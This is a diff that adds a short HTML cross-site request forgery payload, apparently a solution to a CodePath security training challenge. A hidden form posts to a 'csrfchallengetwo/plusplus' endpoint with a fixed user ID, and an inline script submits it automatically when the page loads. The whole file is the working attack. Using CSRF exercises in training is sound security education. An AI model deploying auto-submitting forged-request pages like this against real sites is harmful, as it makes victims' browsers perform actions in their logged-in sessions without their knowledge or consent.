@@ -1,0 +1,7 @@
+<form name="csrfForm" action="https://security.codepath.com/index.jsp/user/csrfchallengetwo/plusplus?userid=98101698db23359c5ba1ebc3bd65c1c701913364" method="POST">
+
+ <input type="submit"/>
+</form>
+<script>
+ document.csrfForm.submit();
+</script>
